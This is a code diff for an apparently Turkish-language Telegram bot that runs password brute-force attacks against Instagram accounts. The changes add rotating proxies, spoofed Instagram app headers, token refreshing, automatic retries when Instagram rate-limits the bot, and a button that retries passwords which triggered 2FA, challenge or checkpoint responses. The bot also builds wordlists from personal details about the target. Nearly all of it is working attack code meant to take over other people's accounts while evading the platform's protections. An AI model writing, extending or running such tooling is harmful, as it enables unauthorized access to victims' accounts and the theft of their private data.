@@ -10,7 +10,7 @@ import re
 import requests
 import itertools
 import os
-import uuid  # Yeni: UUID için
+import uuid
 from typing import List, Optional
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
 from telegram.ext import (
@@ -217,7 +217,7 @@ class InstagramBruteForce:
             try:
                 test_session = requests.Session()
                 test_session.proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
-                response = test_session.get('https://httpbin.org/ip', timeout=5)
+                response = test_session.get('https://www.instagram.com/', timeout=5)
                 if response.status_code == 200:
                     test_session.close()
                     self.proxy_cache[proxy] = {'status': 'working', 'last_used': time.time()}
@@ -233,7 +233,6 @@ class InstagramBruteForce:
                 logger.warning(f"Proxy hatası: {proxy}, {str(e)}")
             time.sleep(0.5)
         
-        # Yeni proxy'ler çek
         self.proxy_list = self._fetch_proxy_list()
         self.proxy_cycle = itertools.cycle(self.proxy_list) if self.proxy_list else None
         if not self.proxy_list:
@@ -251,12 +250,12 @@ class InstagramBruteForce:
             'Accept-Encoding': 'gzip, deflate, br',
             'Connection': 'keep-alive',
             'Upgrade-Insecure-Requests': '1',
-            'X-ASBD-ID': '129477',  # Yeni eklenen header
-            'X-IG-App-Locale': 'en_US',  # Yeni
-            'X-IG-Device-Locale': 'en_US',  # Yeni
-            'X-IG-Mapped-Locale': 'en_US',  # Yeni
-            'X-Pigeon-Session-Id': str(uuid.uuid4()),  # Yeni: Random session ID
-            'X-IG-App-ID': '1217981644879628'  # Güncel App ID
+            'X-ASBD-ID': '129477',
+            'X-IG-App-Locale': 'en_US',
+            'X-IG-Device-Locale': 'en_US',
+            'X-IG-Mapped-Locale': 'en_US',
+            'X-Pigeon-Session-Id': str(uuid.uuid4()),
+            'X-IG-App-ID': '1217981644879628'
         })
         self.current_proxy = self._get_working_proxy()
         if self.current_proxy:
@@ -272,6 +271,21 @@ class InstagramBruteForce:
                 self.session.proxies = {}
             
             try:
+                self.session = requests.Session()
+                self.session.headers.update({
+                    'User-Agent': self._get_realistic_user_agent(),
+                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+                    'Accept-Language': 'en-US,en;q=0.9,tr;q=0.8',
+                    'Accept-Encoding': 'gzip, deflate, br',
+                    'Connection': 'keep-alive',
+                    'Upgrade-Insecure-Requests': '1',
+                    'X-ASBD-ID': '129477',
+                    'X-IG-App-Locale': 'en_US',
+                    'X-IG-Device-Locale': 'en_US',
+                    'X-IG-Mapped-Locale': 'en_US',
+                    'X-Pigeon-Session-Id': str(uuid.uuid4()),
+                    'X-IG-App-ID': '1217981644879628'
+                })
                 response = self.session.get('https://www.instagram.com/', timeout=15)
                 if response.status_code != 200:
                     raise Exception(f"Instagram'a erişilemiyor: {response.status_code}")
@@ -298,7 +312,7 @@ class InstagramBruteForce:
                 return self.csrf_token is not None
             except Exception as e:
                 logger.warning(f"Token alma hatası (Deneme {attempt}/{max_attempts}): {e}")
-                if progress_callback and attempt % 3 == 0: 
+                if progress_callback and attempt % 3 == 0:
                     await progress_callback(f"🔍 Token bulmaya çalışıyorum ({attempt}/{max_attempts})")
                 if attempt < max_attempts:
                     await asyncio.sleep(5)
@@ -308,7 +322,7 @@ class InstagramBruteForce:
             await progress_callback("⚠️ Token'lar alınamadı, proxysiz devam ediliyor...")
         return False
 
-    def _make_login_request(self, username: str, password: str):
+    def _make_login_request(self, username: str, password: str, retry_count: int = 0, max_retries: int = 3):
         headers = {
             'Accept': '*/*',
             'Accept-Language': 'en-US,en;q=0.9,tr;q=0.8',
@@ -317,12 +331,12 @@ class InstagramBruteForce:
             'Referer': self.login_url,
             'X-CSRFToken': self.csrf_token,
             'X-Instagram-AJAX': self.rollout_hash,
-            'X-IG-App-ID': '1217981644879628',  # Güncel
+            'X-IG-App-ID': '1217981644879628',
             'X-IG-WWW-Claim': '0',
             'X-Requested-With': 'XMLHttpRequest',
-            'X-ASBD-ID': '129477',  # Yeni
-            'X-Pigeon-Session-Id': str(uuid.uuid4()),  # Yeni
-            'X-IG-App-Locale': 'en_US'  # Yeni
+            'X-ASBD-ID': '129477',
+            'X-Pigeon-Session-Id': str(uuid.uuid4()),
+            'X-IG-App-Locale': 'en_US'
         }
         
         timestamp = int(time.time())
@@ -339,14 +353,31 @@ class InstagramBruteForce:
         
         try:
             response = self.session.post(self.api_url, headers=headers, data=data, timeout=15)
-            logger.debug(f"API Yanıtı: {response.text}")
+            logger.debug(f"API Yanıtı ({password}): {response.status_code} - {response.text}")
+            if response.status_code == 429:
+                logger.warning(f"Rate limit alındı: {password}, bekleniyor...")
+                time.sleep(60)
+                if retry_count < max_retries:
+                    self.current_proxy = self._get_working_proxy()
+                    if self.current_proxy:
+                        self.session.proxies = {'http': f'http://{self.current_proxy}', 'https': f'http://{self.current_proxy}'}
+                    else:
+                        self.session.proxies = {}
+                    return self._make_login_request(username, password, retry_count + 1, max_retries)
             return response
         except Exception as e:
-            logger.warning(f"Login request hatası: {e}")
+            logger.warning(f"Login request hatası ({password}): {e}")
+            if retry_count < max_retries:
+                self.current_proxy = self._get_working_proxy()
+                if self.current_proxy:
+                    self.session.proxies = {'http': f'http://{self.current_proxy}', 'https': f'http://{self.current_proxy}'}
+                else:
+                    self.session.proxies = {}
+                return self._make_login_request(username, password, retry_count + 1, max_retries)
             return None
 
     async def brute_force(self, username: str, password_list: List[str], 
-                         progress_callback: Optional[callable] = None):
+                         progress_callback: Optional[callable] = None, context: Optional[ContextTypes.DEFAULT_TYPE] = None):
         start_time = time.time()
         total_passwords = len(password_list)
         potential_passwords = set()
@@ -362,12 +393,13 @@ class InstagramBruteForce:
             await progress_callback(f"✅ Token'lar alındı! Şifreler deneniyor...")
             
             for i, password in enumerate(password_list):
-                if self.proxy_list and i % 5 == 0:  # Daha sık proxy değiştir
+                if self.proxy_list and (i % 5 == 0 or self.current_proxy in self.proxy_cache and self.proxy_cache[self.current_proxy]['status'] == 'banned'):
                     self.current_proxy = self._get_working_proxy(progress_callback)
                     if self.current_proxy:
                         self.session.proxies = {'http': f'http://{self.current_proxy}', 'https': f'http://{self.current_proxy}'}
                     else:
                         self.session.proxies = {}
+                    await self._get_initial_cookies_and_tokens(progress_callback)
                 
                 response = self._make_login_request(username, password)
                 result = "ERROR"
@@ -377,10 +409,16 @@ class InstagramBruteForce:
                         json_data = response.json()
                         if 'challenge_required' in json_data or json_data.get('message') == 'challenge_required':
                             result = "CHALLENGE_REQUIRED"
+                            potential_passwords.add(password)
                             await progress_callback(f"🔐 Şifre deneniyor ({i+1}/{total_passwords}): {password} - {result}")
-                            await progress_callback("🚧 Challenge required! Proxy değiştiriliyor...")
-                            self.current_proxy = self._get_working_proxy(progress_callback)  # Proxy değiştir
-                            continue  # Retry aynı şifre için veya skip
+                            await progress_callback(f"🚧 Challenge required! Şifre doğru olabilir: {password}. Proxy değiştiriliyor...")
+                            self.current_proxy = self._get_working_proxy(progress_callback)
+                            if self.current_proxy:
+                                self.session.proxies = {'http': f'http://{self.current_proxy}', 'https': f'http://{self.current_proxy}'}
+                            else:
+                                self.session.proxies = {}
+                            await self._get_initial_cookies_and_tokens(progress_callback)
+                            continue
                         if json_data.get('authenticated'):
                             result = "SUCCESS"
                             await progress_callback(f"🔐 Şifre deneniyor ({i+1}/{total_passwords}): {password} - {result}")
@@ -390,18 +428,22 @@ class InstagramBruteForce:
                             result = "WRONG"
                         elif json_data.get('two_factor_required'):
                             result = "2FA"
+                            potential_passwords.add(password)
                             await progress_callback(f"🔐 Şifre deneniyor ({i+1}/{total_passwords}): {password} - {result}")
                             await progress_callback(f"🔐 2FA gerekli! Şifre doğru: {password}")
                             return password
                         elif json_data.get('checkpoint_url'):
                             result = "CHECKPOINT"
+                            potential_passwords.add(password)
                             await progress_callback(f"🔐 Şifre deneniyor ({i+1}/{total_passwords}): {password} - {result}")
                             await progress_callback(f"🚧 Checkpoint gerekli! Şifre doğru: {password}")
                             return password
                         else:
                             result = "UNKNOWN"
+                            potential_passwords.add(password)
                     except json.JSONDecodeError:
                         result = "ERROR"
+                        potential_passwords.add(password)
                 
                 await progress_callback(f"🔐 Şifre deneniyor ({i+1}/{total_passwords}): {password} - {result}")
                 
@@ -410,15 +452,26 @@ class InstagramBruteForce:
                 if (i + 1) % 5 == 0:
                     await self._get_initial_cookies_and_tokens(progress_callback)
                 
-                delay = random.uniform(15, 30)  # Delay artır
+                delay = random.uniform(20, 40)
                 await asyncio.sleep(delay)
             
             report = f"📊 Rapor:\nDenenen şifre: {tried_passwords}/{total_passwords}"
             if potential_passwords:
-                report += f"\n⚠️ Hata alınan şifreler (doğru olabilir): {', '.join(list(potential_passwords)[:5])}"
-            
-            await progress_callback(report)
-            return None
+                report += f"\n⚠️ Potansiyel doğru şifreler (challenge/2FA/checkpoint alındı): {', '.join(list(potential_passwords)[:10])}"
+                await progress_callback(report)
+                if context:
+                    keyboard = [
+                        [InlineKeyboardButton("🔄 Tekrar Dene", callback_data='retry_potential')],
+                        [InlineKeyboardButton("❌ İptal", callback_data='cancel')]
+                    ]
+                    reply_markup = InlineKeyboardMarkup(keyboard)
+                    context.user_data['potential_passwords'] = list(potential_passwords)
+                    context.user_data['username'] = username
+                    await progress_callback("🔄 Bu şifreler doğru olabilir. Tekrar denemek ister misiniz?", reply_markup=reply_markup)
+                return None
+            else:
+                await progress_callback(report)
+                return None
             
         except Exception as e:
             logger.error(f"Brute force hatası: {e}")
@@ -555,24 +608,20 @@ class TelegramBot:
                     'randnum': '-rand' in profile_input
                 }
                 
-                # Şifre listesini oluştur
                 wordlist = self.password_generator.generate_wordlist(profile)
                 if not wordlist:
                     await update.message.reply_text("❌ Şifre listesi oluşturulamadı! Lütfen bilgileri kontrol et.")
                     return
                 
-                # Şifreleri dosyaya kaydet
                 file_path = f"generated_passwords_{user_id}.txt"
                 with open(file_path, 'w', encoding='utf-8') as f:
                     for password in wordlist:
                         f.write(password + '\n')
                 
-                # Kullanıcıya dosyayı gönder
                 with open(file_path, 'rb') as f:
                     await update.message.reply_document(document=InputFile(f, filename=f"passwords_{user_id}.txt"),
                                                     caption=f"✅ {len(wordlist)} şifre oluşturuldu!")
                 
-                # Oluşturulan dosyayı user_data'ya kaydet
                 self.user_data[user_id]['password_file'] = file_path
                 context.user_data['awaiting'] = None
             except Exception as e:
@@ -621,7 +670,9 @@ class TelegramBot:
             
             4. **Saldırıyı Başlat**: "🚀 Saldırıyı Başlat" butonuna tıklayın. Bot, yüklediğiniz şifre listesini kullanarak hedef hesaba deneme yapacaktır.
             
-            5. **İptal**: Herhangi bir anda "❌ İptal" butonuna basarak işlemi durdurabilirsiniz.
+            5. **Tekrar Deneme**: Eğer bazı şifreler "challenge", "2FA" veya "checkpoint" nedeniyle başarısız olduysa, bot bunları listeler ve tekrar denemek isteyip istemediğinizi sorar.
+            
+            6. **İptal**: Herhangi bir anda "❌ İptal" butonuna basarak işlemi durdurabilirsiniz.
             
             ⚠️ **Notlar**:
             - Bot, Instagram'ın güvenlik mekanizmalarına (CAPTCHA, 2FA, checkpoint) karşı hassastır.
@@ -636,8 +687,13 @@ class TelegramBot:
         elif query.data == 'start_attack':
             await self.start_attack(update, context)
 
+        elif query.data == 'retry_potential':
+            await self.retry_potential_passwords(update, context)
+
         elif query.data == 'cancel':
             context.user_data['awaiting'] = None
+            context.user_data.pop('potential_passwords', None)
+            context.user_data.pop('username', None)
             await query.message.reply_text("❌ İşlem iptal edildi.")
 
     async def start_attack(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -664,22 +720,61 @@ class TelegramBot:
         
         instagram_brute = InstagramBruteForce()
         
-        async def progress_callback(message):
+        async def progress_callback(message, reply_markup=None):
             try:
-                await query.message.reply_text(message)
+                await query.message.reply_text(message, reply_markup=reply_markup)
             except Exception as e:
                 logger.error(f"Progress callback error: {e}")
         
         result = await instagram_brute.brute_force(
             self.user_data[user_id]['username'],
             passwords,
-            progress_callback
+            progress_callback,
+            context
         )
         
         if result:
             await query.message.reply_text(f"🎉 BAŞARILI! Şifre bulundu: {result}")
-        else:
-            await query.message.reply_text("❌ Şifre bulunamadı!")
+            context.user_data.pop('potential_passwords', None)
+            context.user_data.pop('username', None)
+
+    async def retry_potential_passwords(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        query = update.callback_query
+        await query.answer()
+        user_id = query.from_user.id
+        
+        potential_passwords = context.user_data.get('potential_passwords', [])
+        username = context.user_data.get('username')
+        
+        if not username:
+            await query.message.reply_text("❌ Kullanıcı adı bulunamadı! Lütfen tekrar /start ile başlayın.")
+            return
+        
+        if not potential_passwords:
+            await query.message.reply_text("❌ Tekrar denenecek şifre bulunamadı!")
+            return
+        
+        await query.message.reply_text(f"🔄 Potansiyel şifreler tekrar deneniyor...\nHedef: {username}\nŞifre sayısı: {len(potential_passwords)}")
+        
+        instagram_brute = InstagramBruteForce()
+        
+        async def progress_callback(message, reply_markup=None):
+            try:
+                await query.message.reply_text(message, reply_markup=reply_markup)
+            except Exception as e:
+                logger.error(f"Progress callback error: {e}")
+        
+        result = await instagram_brute.brute_force(
+            username,
+            potential_passwords,
+            progress_callback,
+            context
+        )
+        
+        if result:
+            await query.message.reply_text(f"🎉 BAŞARILI! Şifre bulundu: {result}")
+            context.user_data.pop('potential_passwords', None)
+            context.user_data.pop('username', None)
 
 def main():
     application = Application.builder().token(TOKEN).build()
